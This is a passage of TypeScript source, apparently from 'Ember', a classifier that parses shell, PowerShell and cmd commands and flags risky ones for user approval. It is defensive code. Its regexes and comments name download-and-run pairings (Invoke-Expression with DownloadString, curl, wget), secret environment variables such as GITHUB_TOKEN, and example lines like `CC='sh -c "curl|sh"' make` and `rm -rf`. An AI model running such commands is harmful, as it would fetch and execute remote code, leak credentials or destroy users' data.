   * stay on the card (heldTo). Where the tables agree, which is nearly always, the row is judged once, as before.
   */
  runRow(row: Handler, h: H): void {
    if (this.asMain) { row(h); return; }
    const outer = this.tablesDiffer;
    const stood = this.refusal();
    const from = this.findings.length;
    const cd0 = this.cdTarget;
    this.tablesDiffer = false;
    let differ: boolean;
    try { row(h); } finally { differ = this.tablesDiffer; this.tablesDiffer = outer; }
    if (!differ) return;
    const own = this.refusal();
    const ownCd = this.cdTarget;
    let mainCd = ownCd;
    let before: Finding[];
    this.asMain = true;
    try { before = this.foundApartWhole(() => { this.cdTarget = cd0; row(h); mainCd = this.cdTarget; }, undefined, true); } finally { this.asMain = false; }
    // The folder the command leaves the shell in is the one the row's own reading gives; where main's reading gives
    // another (`env --block-signal cd /tmp`: main's table took the cd for the option's word), the whole line is judged
    // again with main's (heldToMainFolders).
    if (mainCd !== ownCd) { this.foldersDiffer = true; if (this.mainFolders) this.cdTarget = mainCd; }
    // The row's own refusal is said in its own words, and one that stood before the row keeps its own; one only main's
    // reading made says what Ember can't tell (commands-held-x9-7).
    if (own.refuse !== stood.refuse) this.putRefusal(own);
    else if (this.refusal().refuse !== stood.refuse) { if (stood.refuse) this.putRefusal(stood); else this.heldRefusal(); }
    const found = this.findings.slice(from);
    if (before.every(f => found.some(g => sameFinding(f, g)))) return;
    this.heldTo(before, from, "unclear.option-value", SAYS.optionValue);
  }

  run(text: string): ClassificationExtra {
    const sc = this.topScope();
    if (text.length > MAX_COMMAND_CHARS) {
      this.unclear("unclear.too-long", "It is longer than Ember can check one by one.");
      this.fallbackScan(text, sc);
      return this.result();
    }
    this.checkCharacters(text, sc.family);
    this.classifyText(text, this.topShell, sc);
    if (this.foldersDiffer) this.heldToMainFolders(text);
    if (this.chainMoved) this.heldToChainFolders(text);
    return this.result();
  }

  /**
   * Holds a line whose && chain moved the folder to what follows the chain's end being judged in an unknown folder
   * (commands-held-y9-1): in `cd /srv/x && true ; sed -i … ../.config/ember/settings.json` the sed runs where the line
   * started when the cd fails. The line is judged again apart with the folder unknown after each such chain; its
   * refusal stands, and unless everything it found the line's own judging found too, the line asks with the dangers it
   * named kept on the card (heldTo). The line's own refusal, judged in the chain's folder, stands first.
   */
  private heldToChainFolders(text: string): void {
    const own = this.refusal();
    let was: Finding[];
    this.chainUnknown = true;
    try { was = this.foundApartWhole(() => this.classifyText(text, this.topShell, this.topScope()), undefined, true); } finally { this.chainUnknown = false; }
    if (own.refuse) this.putRefusal(own);
    if (was.every(f => this.findings.some(g => sameFinding(f, g)))) return;
    this.heldTo(was, 0, "unclear.folder", "Ember can't tell which folder this command runs in.");
  }

  /**
   * Holds a line to the folders main's reading of its held rows leaves the shell in (commands-held-y9-1). Where a
   * wrapper's two tables disagree about a `cd` (`cd ~/.config && env --block-signal cd /tmp && rm -rf ember`: by
   * today's table env runs the cd, by main's the cd was the option's word and the folder stayed), what follows was
   * judged in the folder the row's own reading gives. The whole line is judged again with main's folder for each such
   * row, apart: its refusal stands (Ember's own folder, named from where main stood), and unless everything it found
   * the line's own judging found too, the line asks with the dangers it named kept on the card (heldTo).
   */
  private heldToMainFolders(text: string): void {
    const own = this.refusal();
    let was: Finding[];
    this.mainFolders = true;
    try { was = this.foundApartWhole(() => this.classifyText(text, this.topShell, this.topScope()), undefined, true); } finally { this.mainFolders = false; }
    if (this.refusal().refuse !== own.refuse) { if (own.refuse) this.putRefusal(own); else this.heldRefusal(); }
    if (was.every(f => this.findings.some(g => sameFinding(f, g)))) return;
    this.heldTo(was, 0, "unclear.option-value", SAYS.optionValue);
  }

  private result(): ClassificationExtra {
    // A script this same command writes, moves or unpacks before it runs (`echo … > t.sh; sh t.sh`, `cp a.sh t.sh &&
    // ./t.sh`, `tar xf a.tar && sh t.sh`): what is on disk now isn't what will run (L8, the lead's ruling).
    if (this.scriptWritten()) {
      this.unclear("unclear.script-written", "It runs a script that this command writes first, so Ember can't read it beforehand.");
    }
    this.feedReads();
    this.judgePendingSets();
    // A `read` that its loop or `if` gives a file or text to (`while read -r l; …; done < list.txt`) waits for no typing.
    const fed = readsFedByCompound(this.commands, i => this.stdinGiven.has(i));
    if (fed.size) this.findings = this.findings.filter(f => !(f.rule === "unclear.interactive" && f.program === "read" && fed.has(f.at)));
    this.judgeReadText();
    const out: ClassificationExtra = {
      shell: this.topShell,
      family: SHELL_FAMILY[this.topShell] ?? "posix",
      findings: this.findings,
      refuse: this.refuse,
      probe: this.probe,
      needsGit: this.needsGit,
      downloads: this.downloads,
      programs: this.programs,
      commands: this.commands,
      cwd: this.ctx.cwd,
      windowsReach: this.windowsReach,
      scripts: this.scripts,
      writes: [...new Set([...this.written.map(w => w.p), ...this.unnamedAt])],
      // Code Ember can't see (unclear), or that it can't follow (a download run, a program that keeps running after the
      // command), writes where it likes once the user says yes.
      writesAnywhere: this.unnamedAnywhere || this.findings.some(f => f.cls === "unclear" || f.cls === "escape"),
      writesUnplaced: this.unnamedAnywhere,
      holdsFlow: this.setsVars || this.commands.some(changesShellState),
      ...(this.downloadsIfFile.length ? { downloadsIfFile: this.downloadsIfFile } : {}),
    };
    // A variable set anywhere in the text may redirect a command (GH_REPO, NPM_CONFIG_REGISTRY, P4PORT): no intent
    // row covers a finding of such a text.
    if (this.envChanged) for (const f of this.findings) if (!f.widening.includes("env")) f.widening.push("env");
    const cd = this.topCd;
    if (cd && cd.abs && this.commands.length === 1 && cd.at === 0 && this.findings.length === 0 && !this.refuse && this.commands[0].redirects.length === 0) {
      out.cdOnly = cd.abs;
    }
    return out;
  }

  private topScope(): Scope {
    const ctx = this.ctx;
    const os = ctx.os;
    const flavour = flavourOf(os);
    const windows = ctx.wsl ? ctx.wsl.windows : os === "win32" ? windowsContextOf(ctx.home, ctx.ember.paths.filter(p => /^[A-Za-z]:/.test(p))) : null;
    const mountRoot = ctx.wsl ? ctx.wsl.mountRoot.replace(/\/+$/, "") || "/" : null;
    const path = pathEnv({ flavour, os, home: ctx.home || null, cwd: ctx.cwd || null, mountRoot, windows, ember: ctx.ember.paths, tempDirs: ctx.tempDirs });
    return child({
      family: SHELL_FAMILY[this.topShell] ?? "posix", shell: this.topShell, os, path, cwd: ctx.cwd || null, home: ctx.home || null,
      wrappers: [], depth: 0, wsl: !!ctx.wsl, mountRoot, windows, fromWsl: false,
    });
  }

  /**
   * Control, format and direction characters make a command unclear wherever they are (they hide what runs), and so
   * do half a surrogate pair (not text at all), private-use characters, line and paragraph separators and spaces
   * other than the plain one (a shell reads them as part of a word, the card shows them as a gap).
   */
  private checkCharacters(text: string, family: ShellFamily): void {
    const body = family === "posix" ? text : text.replace(/\r\n/g, "\n");
    // eslint-disable-next-line no-control-regex -- control characters are exactly what is looked for here
    if (/[\x00-\x08\x0b-\x1f\x7f-\x9f]/.test(body) || /[\p{Cf}\p{Cs}\p{Co}\p{Zl}\p{Zp}]|(?! )\p{Zs}/u.test(body)) {
      this.unclear("unclear.hidden-characters", "It holds control or invisible characters.");
    }
  }

  /**
   * What PowerShell text says wherever it is, parsed or not: SendKeys (from `[System.Windows.Forms.SendKeys]` or a
   * WScript.Shell object) is refused (D4.5), and Invoke-Expression in a text that downloads (a WebClient's
   * DownloadString, Invoke-WebRequest, curl) is download-and-run (§3.4.7).
   */
  private psTextScan(text: string, sc: Scope): void {
    if (SENDKEYS.test(text)) this.refuseWith("ember.input", "input");
    // A WebClient's DownloadFile saves relative to .NET's current folder, which need not be PowerShell's: a download
    // Ember can't place (commands-remote-c5-2).
    if (/\.DownloadFile(Async|TaskAsync)?\s*\(/i.test(text)) this.downloadUnnamed(null, sc);
    if (/(^|[^\w-])(iex|invoke-expression)([^\w-]|$)/i.test(text)
      && /download(string|data|file)|net\.webclient|invoke-webrequest|invoke-restmethod|(^|[^\w-])(iwr|irm|curl|wget|start-bitstransfer)([^\w-]|$)/i.test(text)) {
      this.add("escape", "escape.download-run", SAYS.downloadsAndRuns);
    }
    // .NET's own way to a variable named for a secret, wherever it stands (`[Environment]::GetEnvironmentVariable(
    // "GITHUB_TOKEN")`): the text hands it on or prints it (commands-classes-x9-9).
    for (const m of text.matchAll(/GetEnvironmentVariable\(\s*["']([A-Za-z_][A-Za-z0-9_]*)["']/gi)) {
      if (SECRET_VAR.test(m[1])) { this.add("secret", "secret.env", SAYS.env); break; }
    }
  }

  /** Classifies a whole command text in a family (nested `sh -c`, `cmd /c`, `powershell -Command` too). */
  classifyText(text: string, shell: ShellId, sc: Scope): void {
    if (sc.depth > 8) { this.unclear("unclear.depth", "It nests commands too deeply for Ember to follow."); return; }
    const family = SHELL_FAMILY[shell];
    if (family === "posix") {
      const p = lexPosix(text, shell === "zsh" ? "zsh" : shell === "bash" ? "bash" : "sh");
      this.noteUnclear(p.unclear);
      if (p.fatal) { this.fallbackScan(text, sc); return; }
      this.posixList(p.list, child(sc, { family: "posix", shell }, more(sc)));
      return;
    }
    if (family === "powershell") {
      const p = lexPowerShell(text);
      this.noteUnclear(p.unclear);
      if (p.fatal) this.fallbackScan(text, sc);
      else this.psStatements(p.statements, child(sc, { family: "powershell", shell: "powershell" }));
      this.psTextScan(text, sc);
      return;
    }
    const p = lexCmd(text);
    this.noteUnclear(p.unclear);
    if (p.fatal) { this.fallbackScan(text, sc); return; }
    this.cmdLine(p, child(sc, { family: "cmd", shell: "cmd" }));
  }

  /**
   * A text that couldn't be parsed is unclear; Ember's flat refusals still apply to what it can see in it (a program
   * that synthesises input, an Ember path or an `ember:` URL anywhere in it).
   */
  private fallbackScan(text: string, sc: Scope): void {
    const tokens = text.split(/[\s;|&()<>'"`$={}]+/).filter(t => t !== "");
    for (const t of tokens) {
      const base = (t.split(/[\\/]/).pop() ?? t).toLowerCase().replace(/\.(exe|com|bat|cmd)$/, "");
      if (INPUT_SYNTH.has(base)) this.refuseWith("ember.input", "input");
      if (/^ember:/i.test(t)) this.refuseWith("ember.url", "input");
      if (/^[~/\\]|^[A-Za-z]:[\\/]/.test(t) && (sc.home || !t.startsWith("~"))) {
        const abs = resolveTargetPath(t, { os: sc.os, home: sc.home ?? "", cwd: sc.cwd ?? "/" });
        if (isEmberPath(abs, sc.path)) this.refuseWith("ember.path", "safety");
      }
    }
    if (this.findings.every(f => f.cls !== "unclear")) this.unclear("unclear.syntax");
  }

  // ----------------------------------------------------------------------------------------------------------------
  // POSIX.

  private posixList(list: PList, sc: Scope): void {
    for (const item of list.items) {
      let from = sc.cwd;
      for (let k = 0; k < item.pipes.length; k++) {
        this.cdTarget = undefined;
        const before = sc.cwd;
        const cd = this.posixPipeline(item.pipes[k], sc, item.background);
        const next = item.ops[k];
        if (cd !== undefined) {
          // A cd joined by && holds for what follows; after ; or || it may have failed: the folder is unknown.
          sc.cwd = next === "&&" ? cd : cd === before ? before : null;
        }
        if (next !== "&&") from = this.chainEnds(from, sc);
      }
    }
  }

  /**
   * Where an && chain ends (`;`, `||`, `&`, a new line), a cd in it may have failed, so what follows may run in the
   * folder the chain started in (commands-held-y9-1, y9-2): the line is judged again with that folder unknown, as after
   * a lone `cd x ;` (heldToChainFolders). Returns the folder the next chain starts in.
   */
  private chainEnds(from: string | null, sc: Scope): string | null {
    if (sc.cwd !== from && sc.cwd !== null) {
      this.chainMoved = true;
      if (this.chainUnknown) sc.cwd = null;
    }
    return sc.cwd;
  }

  /** Classifies a pipeline; returns the folder when it is a lone `cd` (not in the background). */
  private posixPipeline(pipe: PList["items"][number]["pipes"][number], sc: Scope, background: boolean): string | null | undefined {
    this.pipe = { fetch: more(sc).pipedIn?.fetch ?? false, program: "" };
    let cd: string | null | undefined;
    let prev: number | undefined;
    // What an echo or printf before it prints: the next command's input (commands-remote-c5-1).
    let carry: Printed | null = null;
    pipe.cmds.forEach((c, k) => {
      const first = k === 0;
      const stdinPipe = !first || (first && more(sc).pipedIn !== null);
      const given = carry;
      carry = null;
      if (c.kind === "simple") {
        this.cdTarget = undefined;
        carry = this.posixSimple(c, sc, { stdinPipe, background, pipedFrom: first ? undefined : prev, pipedOn: k < pipe.cmds.length - 1, carriedOn: pipe.cmds[k + 1]?.kind === "simple", given });
        if (pipe.cmds.length === 1 && !background && this.cdTarget !== undefined) cd = this.cdTarget;
        prev = this.at;
        return;
      }
      // A group or subshell given what echo or printf printed with a variable in it: a use Ember doesn't follow.
      if (given?.vars) this.useUnjudged(given.vars.names, true);
      // A subshell or group: a subshell's (or a backgrounded or piped group's) cd doesn't leak.
      const isolated = c.kind === "subshell" || pipe.cmds.length > 1 || background;
      const inner = isolated ? child(sc, { depth: sc.depth + 1 }, { pipedIn: stdinPipe ? { fetch: this.pipe.fetch } : null, ...(k < pipe.cmds.length - 1 ? { captured: true as const } : {}) }) : sc;
      const redirs = c.redirs.map(r => this.posixRedir(r, sc));
      if (redirs.some(r => (r.kind === "write" || r.kind === "append") && !r.op.startsWith("2"))) this.compoundOnward = true;
      if (redirs.some(r => r.kind !== "none") || background) {
        this.newCommand(c.kind === "subshell" ? "( … )" : "{ … }", [], sc, redirs, background, first ? undefined : prev);
        this.redirects(redirs, sc);
        if (background) this.add("escape", "escape.background", SAYS.keepsRunning);
      }
      const savedPipe = this.pipe;
      const outer = this.gaveFetched;
      this.gaveFetched = false;
      this.posixList(c.body, inner);
      this.pipe = savedPipe;
      // What a group or subshell fetched, or fetched text it printed, written to the file its own redirection names is
      // the download (`{ curl …; } > x.sh`, `(echo "$x") > x.sh`: commands-remote-x7-8).
      if (this.gaveFetched) for (const r of redirs) if ((r.kind === "write" || r.kind === "append") && !r.op.startsWith("2") && r.target?.v) this.download(r.target.v, sc);
      this.gaveFetched ||= outer;
      prev = this.at;
    });
    return cd;
  }

  /** Classifies the commands in a substitution; returns whether one of them fetched from the network. */
  private subList(list: PList, sc: Scope): boolean {
    const savedPipe = this.pipe;
    const savedAt = this.at;
    const savedProg = this.program;
    const savedCd = this.cdTarget;
    const before = this.commands.length;
    this.posixList(list, child(sc, { depth: sc.depth + 1 }, { pipedIn: null, captured: true }));
    const fetch = this.commands.slice(before).some(c => FETCHERS.has(c.program.toLowerCase()));
    this.pipe = savedPipe;
    this.at = savedAt;
    this.program = savedProg;
    this.cdTarget = savedCd;
    return fetch;
  }

  /** Classifies a simple command; returns what it prints into the next command of its pipeline when Ember sees that. */
  private posixSimple(c: PSimple, sc: Scope, o: { stdinPipe: boolean; background: boolean; pipedFrom?: number; pipedOn?: boolean; carriedOn?: boolean; given?: Printed | null }): Printed | null {
    // Substitutions run first; their commands are classified as commands of their own.
    const fetchOf = new Map<PWord, boolean>();
    const allWords: PWord[] = [...c.words, ...c.assigns.map(a => a.value), ...c.redirs.flatMap(r => (r.target ? [r.target] : []))];
    for (const w of allWords) for (const sub of w.subs) if (this.subList(sub, sc)) fetchOf.set(w, true);
    for (const r of c.redirs) for (const sub of r.heredoc?.subs ?? []) this.subList(sub, sc);
    // Text a substitution fetched, kept in a variable (`x=$(curl …)`, `export x=$(curl …)`): commands-remote-c7-3.
    // A copy of such a variable holds it too (`y=$x`), and so does one `read` fills from a fetch (`read x < <(curl …)`):
    // commands-remote-x7-8. A variable is never taken off the list: a later `x=hello` may not have run.
    const holdsFetched = (w: PWord): boolean => fetchOf.get(w) === true || [...w.raw.matchAll(/\$\{?[#!]?([A-Za-z_]\w*)/g)].some(m => this.fetchedVars.has(m[1]));
    for (const a of c.assigns) if (holdsFetched(a.value)) this.fetchedVars.add(a.name);
    for (const w of c.words) { const m = /^([A-Za-z_]\w*)=/.exec(w.raw); if (m && holdsFetched(w)) this.fetchedVars.add(m[1]); }
    if (READS_LINES.has(c.words[0]?.raw ?? "") && ((o.stdinPipe && this.pipe.fetch) || c.redirs.some(r => r.target !== null && (r.fd === null || r.fd === 0) && r.op.startsWith("<") && holdsFetched(r.target)))) {
      for (const w of c.words.slice(1)) if (/^[A-Za-z_]\w*$/.test(w.raw)) this.fetchedVars.add(w.raw);
    }
    // The command as Ember reads its words, redirections and input.
    const read = (): { words: Arg[]; redirs: Redir[]; carried: boolean; s: Simple } => {
      const words = c.words.map(w => this.posixWord(w, sc, fetchOf.get(w) ?? false));
      const redirs = c.redirs.map(r => this.posixRedir(r, sc));
      const stdin: Simple["stdin"] = c.redirs.some(r => r.op === "<<" || r.op === "<<-" || r.op === "<<<") ? "heredoc"
        : c.redirs.some(r => r.op === "<") ? "file" : o.stdinPipe ? "pipe" : null;
      // Text echo or printf pipes in is its input as a here-string's would be (commands-remote-c5-1).
      const piped = stdin === "pipe" ? o.given ?? undefined : undefined;
      const stdinText = stdin === "heredoc" ? this.hereText(c.redirs, sc) : piped?.text;
      const stdinVars = stdin === "heredoc" ? (stdinText === null ? this.hereVars(c.redirs, sc) : undefined) : piped?.vars;
      // Written-out text only: a here-string with no tilde, variable or substitution (`<<< "$HOME"` is a value Ember
      // follows, not text written out), a here-document Ember sees whole (commands-a7-2).
      const hereOnly = c.redirs.every(r => (r.fd === null || r.fd === 0) && r.dup === undefined && (r.op === "<<" || r.op === "<<-" || (r.op === "<<<" && r.target !== null && WRITTEN_OUT.test(r.target.raw))));
      const ownInput: Simple["ownInput"] = o.stdinPipe ? "other" : c.redirs.length === 0 ? "none" : hereOnly && typeof stdinText === "string" ? "seen" : "other";
      // What it prints reaches the next command only without a redirection of its output.
      const carried = o.pipedOn === true && o.carriedOn === true && !redirs.some(r => r.kind !== "none" && r.kind !== "read" && !r.op.startsWith("2"));
      const fetched = c.words.some(holdsFetched) || words.some(w => w.fetch === true || varNames(w).some(n => this.fetchedVars.has(n))) || (stdinVars?.names ?? []).some(n => this.fetchedVars.has(n))
        || c.redirs.some(r => r.op === "<<<" && r.target !== null && holdsFetched(r.target));
      const s: Simple = { words, redirs, stdin, stdinText, stdinVars, ownInput, fetchBefore: this.pipe.fetch, background: o.background, pipedFrom: o.pipedFrom, pipedOn: o.pipedOn || more(sc).captured === true, carriedOn: carried, ...(fetched ? { fetched } : {}) };
      return { words, redirs, carried, s };
    };
    // A `${HOME:?}` or `${PWD:?}` in a word or a redirection is read as the home or current folder, so Ember's own
    // refusal and the rules for the path it names apply; before round five it was a word Ember couldn't see, and many
    // commands asked for that alone (`ls ${HOME:?}/x`, `bash "${HOME:?}/x.sh"`, `test -d ${HOME:?}/x`). The command is
    // judged that way too, apart, and where that asks this one asks (commands-remote-r7-2).
    const guards = (w: PWord): boolean => w.segs.some(seg => seg.t === "unres" && seg.of !== undefined && seg.exact === true && (seg.of === "HOME" ? sc.home : seg.of === "PWD" ? sc.cwd : null) != null);
    const guarded = [...c.words, ...c.redirs.flatMap(r => (r.target ? [r.target] : []))].some(guards);
    // The danger that reading named (a write to a file Ember couldn't name) stays on the card (heldTo, commands-held-7).
    const unseenAsked = !guarded ? [] : this.foundApartWhole(() => {
      this.asWritten = true;
      let unseen: ReturnType<typeof read>;
      try { unseen = read(); } finally { this.asWritten = false; }
      if (c.words.length === 0) { this.newCommand("", [], sc, unseen.redirs, o.background, o.pipedFrom); this.redirects(unseen.redirs, sc); } else this.simple(unseen.s, sc);
    }, READ_FLOW_RULE);
    const before = this.findings.length;
    const { words, redirs, carried, s } = read();
    if (c.words.length === 0) {
      this.newCommand("", [], sc, redirs, o.background, o.pipedFrom);
      this.assignments(c.assigns.map(a => ({ name: a.name, value: this.posixWord(a.value, sc, false) })), sc, null, false);
      this.redirects(redirs, sc);
      this.heldTo(unseenAsked, before, "unclear.guarded-word", SAYS.guardedWord);
      return null;
    }
    this.simple(s, sc, () => {
      this.assignments(c.assigns.map(a => ({ name: a.name, value: this.posixWord(a.value, sc, false) })), sc, words[0].v, true);
    });
    this.heldTo(unseenAsked, before, "unclear.guarded-word", SAYS.guardedWord);
    return carried ? printedBy(words) : null;
  }

  /**
   * The text the last here-document or here-string on stdin hands the program: a here-string's word (with its newline),
   * a quoted here-document's body, or an unquoted one's when it expands nothing. null when Ember can't see all of it.
   */
  private hereText(redirs: PRedir[], sc: Scope): string | null {
    const last = redirs.filter(r => (r.fd === null || r.fd === 0) && r.dup === undefined && ["<", "<<", "<<-", "<<<"].includes(r.op)).pop();
    if (!last) return null;
    if (last.op === "<<<") {
      const v = last.target ? this.posixWord(last.target, sc, false).v : null;
      return v === null ? null : `${v}\n`;
    }
    if (!last.heredoc) return null;
    return last.heredoc.quoted || !/[$`\\]/.test(last.heredoc.body) ? last.heredoc.body : null;
  }

  /**
   * The variables the last here-string or unquoted here-document on stdin uses, when Ember can't see its text
   * (hereText null), with a here-string's word (commands-remote-v5-2).
   */
  private hereVars(redirs: PRedir[], sc: Scope): HereVars | undefined {
    const last = redirs.filter(r => (r.fd === null || r.fd === 0) && r.dup === undefined && ["<", "<<", "<<-", "<<<"].includes(r.op)).pop();
    if (!last) return undefined;
    if (last.op === "<<<" && last.target) {
      const word = this.posixWord(last.target, sc, false);
      const names = (word.parts ?? []).flatMap(p => (typeof p !== "string" && p.name !== null ? [p.name] : []));
      return names.length ? { names, word } : undefined;
    }
    if (!last.heredoc || last.heredoc.quoted) return undefined;
    const names = [...last.heredoc.body.matchAll(/\$\{?([A-Za-z_][A-Za-z0-9_]*)/g)].map(m => m[1]);
    return names.length ? { names, word: null } : undefined;
  }

  /**
   * While set, `${HOME:?}` and `${PWD:?}` stay words Ember can't see, as they were before round five: the command is
   * judged that way too, apart, so reading them as the home folder never decides less safely (posixSimple).
   */
  private asWritten = false;

  /** A POSIX word's value with the scope's home and folder (`~`, `$HOME`, `$PWD`, `$(pwd)`); anything else unresolved. */
  posixWord(w: PWord, sc: Scope, fetch: boolean): Arg {
    let v = "";
    let pattern = "";
    let unquoted = "";
    let unresolved = false;
    // A word whose only substitution is a plain `$(pwd)` or `` `pwd` `` gives the folder, as `$PWD` does (review #170).
    const cwdSub = w.subs.length === 1 && w.segs.filter(seg => seg.t === "unres" && seg.why === "command substitution").length === 1 && lonePwd(w.subs[0]);
    // `${x:=…}` and `${x=…}` set x as they expand (holdsFlow, commands-b7-3).
    if (/\$\{[A-Za-z_]\w*(\[[^\]]*\])?:?=/.test(w.raw)) this.setsVars = true;
    // The word as pieces, for Ember's own refusal through variables the text sets (commands-remote-c3-2).
    const parts: Part[] = [];
    // Which parts are unquoted text, where `*`, `?` and `[` match names (commands-remote-v4-4).
    const open: boolean[] = [];
    for (const seg of w.segs) {
      if (seg.t === "lit") {
        v += seg.s;
        parts.push(seg.s);
        open[parts.length - 1] = !seg.q;
        if (seg.q) pattern += seg.s.replace(/[*?[\]\\]/g, "\\$&");
        else { pattern += seg.s; unquoted += seg.s; }
      } else if (seg.t === "var") {
        const val = seg.name === "HOME" ? sc.home : seg.name === "PWD" ? sc.cwd : null;
        if (val === null) { unresolved = true; parts.push({ name: seg.name }); }
        else { v += val; parts.push(val); pattern += val.replace(/[*?[\]\\]/g, "\\$&"); }
      } else if (seg.t === "unres" && seg.why === "command substitution" && cwdSub && sc.cwd) {
        v += sc.cwd;
        parts.push(sc.cwd);
        pattern += sc.cwd.replace(/[*?[\]\\]/g, "\\$&");
      } else if (seg.t === "tilde") {
        if (seg.user !== "") { unresolved = true; parts.push({ name: null }); }
        // A home Ember doesn't know stays `~` (judged as some user's home, never probed: usePath).
        else if (!sc.home) { v += "~"; parts.push("~"); pattern += "~"; }
        else { v += sc.home; parts.push(sc.home); pattern += sc.home.replace(/[*?[\]\\]/g, "\\$&"); }
      } else if (seg.t === "unres" && /^\$[1-9@*]$/.test(seg.why)) {
        // `$1`, `"$@"`: the values `set --` gives them (commands-remote-v4-4).
        unresolved = true;
        parts.push({ name: seg.why.slice(1) });
      } else if (seg.t === "unres" && seg.of !== undefined) {
        // `${d:?}`: the variable's values, for Ember's own refusal (commands-remote-v5-2). A cut or a default (`${d%x}`,
        // `${url##*/}`, `${d:-x}`) may be other text too, so a part Ember can't see stays as well: the near rule and a
        // copied download still see it (commands-remote-w5-1). HOME and PWD are the scope's, as `$HOME` is (w5-3).
        const val = seg.of === "HOME" ? sc.home : seg.of === "PWD" ? sc.cwd : null;
        if (val !== null && seg.exact && !this.asWritten) { v += val; parts.push(val); pattern += val.replace(/[*?[\]\\]/g, "\\$&"); }
        else {
          unresolved = true;
          // A default's plain text (`${d:-build}`, `${XDG_CONFIG_HOME:-$HOME/.config}`, `${d:-~/x}`) is a value too.
          const alt = seg.alt === undefined || /[`"'\\]|\$(?!HOME(?!\w)|\{HOME\})/.test(seg.alt) || (/\$|^~/.test(seg.alt) && !sc.home) ? undefined
            : seg.alt.replace(/^~(?=\/|$)/, sc.home ?? "").replace(/\$(HOME(?!\w)|\{HOME\})/g, sc.home ?? "");
          parts.push({ name: seg.of, ...(seg.exact ? {} : { cut: true as const }), ...(val !== null ? { value: val } : {}), ...(alt !== undefined ? { alt } : {}) });
        }
      } else { unresolved = true; parts.push({ name: null }); }
    }
    const globs = /[*?]/.test(unquoted) || /\[[^\]]*\]/.test(unquoted);
    const glob = !unresolved && globs;
    const a: Arg = { v: unresolved ? null : v, raw: w.raw, glob };
    // A word with a variable that is a pattern as well (`"$d"/emb*`): each form is judged as one, quoted text as itself.
    if (unresolved && globs) {
      let marked = false;
      for (let k = 0; k < parts.length; k++) {
        const part = parts[k];
        if (typeof part !== "string") continue;
        if (!open[k]) parts[k] = part.replace(/[*?[\]\\]/g, "\\$&");
        else if (!marked && /[*?[]/.test(part)) { parts[k] = PATTERN + part; marked = true; }
      }
    }
    if (unresolved) a.parts = parts;
    if (glob) a.pattern = pattern;
    if (fetch || w.proc) a.fetch = fetch;
    return a;
  }

  private posixRedir(r: PRedir, sc: Scope): Redir {
    if (r.dup !== undefined || r.heredoc) return { op: "<<", target: null, kind: "none" };
    const target = r.target ? this.posixWord(r.target, sc, false) : null;
    const err = r.fd === 2;
    switch (r.op) {
      case ">": case ">|": return { op: err ? "2>" : r.op === ">|" ? ">|" : ">", target, kind: "write" };
      case "<>": return { op: ">", target, kind: "write" };
      case ">>": return { op: err ? "2>>" : ">>", target, kind: "append" };
      case "&>": return { op: "&>", target, kind: "write" };
      case "&>>": return { op: "&>>", target, kind: "append" };
      case "<": return { op: "<", target, kind: "read" };
      case "<<<": return { op: "<<<", target: null, kind: "none" };
      default: return { op: "<<", target: null, kind: "none" };
    }
  }

  /**
   * Assignments before a command or alone (§3.4.1): ones that change how commands are found or run are unclear. `IFS`
   * before `read`, `mapfile` or `readarray` (`IFS= read -r l`) lasts only while that built-in splits what it reads, in
   * bash, zsh and sh alike, so it changes how nothing else runs (commands-remote-2); outside a loop or an `if` it still
   * asks, as it did before loops were read through (commands-a7-2).
   */
  private assignments(list: { name: string; value: Arg }[], sc: Scope, program: string | null = null, beforeCommand = program !== null): void {
    if (list.length) this.envChanged = true;
    const splitOnly = sc.family === "posix" && program !== null && READS_LINES.has(program) && sc.wrappers.some(w => LOOP_OR_IF.has(w));
    for (const a of list) {
      if (splitOnly && a.name === "IFS") continue;
      if (RISKY_ASSIGNMENTS.has(a.name) || RISKY_ASSIGNMENT_PREFIX.test(a.name)) {
        this.unclear("unclear.assignment", "It changes how commands are found or run.");
      }
      // A variable set in front of a command whose value names a program or command the command runs is judged, so
      // `CC='sh -c "curl|sh"' make` asks where `make CC='…'` does (commands-remote-c8-1). A compiler or pager variable
      // (PROGRAM_CMD_VARS) and any other name hold a command when the value looks like one; an option variable
      // (PROGRAM_OPT_VARS) when a sub-option names a program (`-toolexec=`, `--to-command=`). An ordinary value
      // (`CC=clang`, `GOFLAGS=-mod=vendor`) runs. Ember's own refusal from the value comes through its row.
      else if (beforeCommand && namesProgram(a.name, a.value.v, a.value.raw)) this.unclear("unclear.assignment", "It changes how commands are found or run.");
      // One set in front of a command to a file this task downloaded, or a folder that holds one, may be a program the
      // command runs (`CC=./cc.sh make`, `EDITOR=./x git commit`): whatever its name (commands-remote-r9-5).
      // After `set -a` a variable set alone is handed to every later program too (commands-classes-y9-5).
      if ((beforeCommand || this.allExport) && a.value.v !== null && this.namesDownload(a.value.v, sc)) this.add("escape", "escape.run-downloaded", SAYS.runsDownloaded);
      if (a.value.v !== null && commandLineSecret(`${a.name}=${a.value.v}`)) this.add("secret", "secret.token-arg", SAYS.tokenArg);
      this.setVar(a.name, [a.value], sc, false, beforeCommand);
    }
  }

  // ----------------------------------------------------------------------------------------------------------------
  // PowerShell.

  private psStatements(sts: PsStatement[], sc: Scope): void {
    sts.forEach((st, si) => {
      if (st.assign) {
        this.envChanged = true;
        this.setPsVar(st.assign, this.psAssigned(st, sc));
        const env = /^env:(.+)$/i.exec(st.assign);
        if (env && (RISKY_ASSIGNMENTS.has(env[1].toUpperCase()) || RISKY_ASSIGNMENTS.has(env[1]) || RISKY_ASSIGNMENT_PREFIX.test(env[1].toUpperCase()))) {
          this.newCommand("", [], sc, [], false);
          this.unclear("unclear.assignment", "It changes how commands are found or run.");
        }
      }
      this.pipe = { fetch: false, program: "" };
      let prev: number | undefined;
      st.elements.forEach((el, k) => {
        if (el.kind === "expr") {
          const savedAt = this.at;
          let fetch = false;
          for (const sub of el.subs) if (this.psSub(sub, sc)) fetch = true;
          const redirs = this.psRedirs(el.redirs, sc);
          this.newCommand("", [], sc, redirs, false, k === 0 ? undefined : prev);
          // A lone value handed down the pipeline (`$d | Remove-Item -Recurse`, `'x.exe' | Copy-Item …`): the item it
          // names, as a listing's (commands-remote-c5-1).
          if (el.subs.length === 0 && /^(\$[\w:]+|'[^']*'|"[^"`]*")$/.test(el.raw.trim())) this.listed.set(this.at, [this.psValue(el.segs, el.raw, sc, true)]);
          if (fetch) this.pipe.fetch = true;
          this.redirects(redirs, sc);
          // A token typed into an assignment (`$env:GITHUB_TOKEN = 'ghp_…'`) is on the command line (§3.5.4).
          if (st.assign && k === 0) {
            const value = el.segs.map(seg => (seg.t === "lit" ? seg.s : "")).join("");
